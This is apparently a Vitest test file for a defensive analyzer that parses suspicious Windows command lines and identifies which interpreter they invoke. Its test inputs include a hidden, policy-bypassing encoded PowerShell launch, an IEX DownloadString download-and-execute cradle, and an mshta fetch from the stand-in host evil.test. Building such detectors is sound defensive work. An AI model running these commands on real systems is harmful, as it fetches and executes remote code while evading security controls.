// shared/analyzer/__tests__/preprocess.test.ts
import { describe, expect, it } from 'vitest'
import { detectInterpreter, preprocess } from '../preprocess'

describe('preprocess', () => {
  it('captures -enc payload and the evasion flags (prefix-matched, case-insensitive)', () => {
    const r = preprocess('powershell.exe -NoP -W Hidden -Ep Bypass -enc AAAAAAAA')
    expect(r.encoded).toBe('AAAAAAAA')
    const flags = r.flags.map((f) => f.flag).sort()
    expect(flags).toEqual(['-enc', '-ep', '-nop', '-w'])
  })

  it('leaves a non-wrapped script alone', () => {
    const r = preprocess("IEX (New-Object Net.WebClient).DownloadString('http://a/x')")
    expect(r.encoded).toBeNull()
    expect(r.script).toContain('DownloadString')
    expect(r.flags).toEqual([])
  })
})

describe('detectInterpreter', () => {
  it('detects each interpreter from its leading token', () => {
    expect(detectInterpreter('powershell.exe -nop -enc AAAA')).toBe('powershell')
    expect(detectInterpreter('pwsh -File x.ps1')).toBe('powershell')
    expect(detectInterpreter('cmd.exe /c whoami')).toBe('cmd')
    expect(detectInterpreter('cmd /c whoami')).toBe('cmd')
    expect(detectInterpreter('mshta http://evil.test/x.hta')).toBe('mshta')
    expect(detectInterpreter('wscript C:\\Users\\Public\\a.vbs')).toBe('wscript')
    expect(detectInterpreter('cscript //E:jscript a.js')).toBe('cscript')
  })

  it('falls back to unknown for anything else', () => {
    expect(detectInterpreter('Get-Process | Stop-Process')).toBe('unknown')
    expect(detectInterpreter('whoami /all')).toBe('unknown')
  })

  it('survives a quoted System32 path prefix', () => {
    expect(detectInterpreter('"C:\\Windows\\System32\\cmd.exe" /c whoami')).toBe('cmd')
  })
})

describe('preprocess() interpreter field — zero regression on the PS path', () => {
  it('a plain PowerShell input\'s script/encoded/flags are byte-identical to before the interpreter field existed', () => {
    const r = preprocess('powershell.exe -NoP -W Hidden -Ep Bypass -enc AAAAAAAA')
    // NOTE: not '' — the pre-existing strip only removes the leading
    // powershell(.exe)/pwsh wrapper token, not the flags that follow; the
    // -Command extraction is a no-op here since none of the flags are -c/-command.
    // Verified against the unmodified (pre-Task-2) strip+trim logic directly.
    expect(r.script).toBe('-NoP -W Hidden -Ep Bypass -enc AAAAAAAA')
    expect(r.encoded).toBe('AAAAAAAA')
    expect(r.flags.map((f) => f.flag).sort()).toEqual(['-enc', '-ep', '-nop', '-w'])
    expect(r.interpreter).toBe('powershell')
  })

  it('an un-prefixed script (unknown interpreter) is byte-identical to before', () => {
    const r = preprocess("IEX (New-Object Net.WebClient).DownloadString('http://a/x')")
    expect(r.encoded).toBeNull()
    expect(r.script).toContain('DownloadString')
    expect(r.flags).toEqual([])
    expect(r.interpreter).toBe('unknown')
  })
})
